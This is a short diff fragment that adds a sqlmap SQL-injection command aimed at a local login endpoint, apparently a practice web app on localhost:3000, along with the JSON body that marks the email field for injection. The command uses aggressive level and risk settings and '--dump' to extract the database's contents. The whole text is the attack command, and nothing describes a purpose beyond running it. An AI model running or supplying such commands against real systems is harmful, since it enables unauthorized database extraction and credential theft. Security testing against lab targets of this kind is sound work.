@@ -1,0 +1,3 @@
+http://localhost:3000/rest/user/login (POST)  # /sqlmap/sqlmap.py -u http://localhost:3000/rest/user/login --data {\"email\":\"*\",\"password\":\"test\"} --method POST "--headers=Content-Type: application/json" --dbms=sqlite --batch --level=5 --risk=3 --technique=BT --threads=5 --output-dir=/output --dump
+
+{"email":"*","password":"test"}
